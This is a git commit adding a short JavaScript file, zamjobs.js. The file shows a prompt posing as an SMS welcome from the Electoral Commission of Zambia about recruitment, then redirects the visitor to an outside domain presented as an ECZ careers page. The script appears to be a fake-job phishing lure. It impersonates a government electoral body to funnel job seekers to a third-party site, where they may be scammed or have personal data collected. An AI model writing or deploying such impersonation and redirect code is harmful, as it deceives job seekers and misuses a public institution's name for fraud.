86d231b05d34256b769e5bdb16bab091716bdc4b
usorondo50 <camels-manes.5o@icloud.com>
2026-03-21 13:59:44 +0100

    Create zamjobs.js

---
+++ zamjobs.js
@@ -0,0 +1,6 @@
+var password = 'ECZ Recruitment'
+password=prompt('SMS: Welcome to Electoral Commission of Zambia (ECZ), Kindly Press OK to PROCEED ','ECZ Recruitment');
+if (password != 'ECZ Recruitment') {
+location.href='https://www.itidenang.site/ecz-career-staff-recruitment';
+
+}
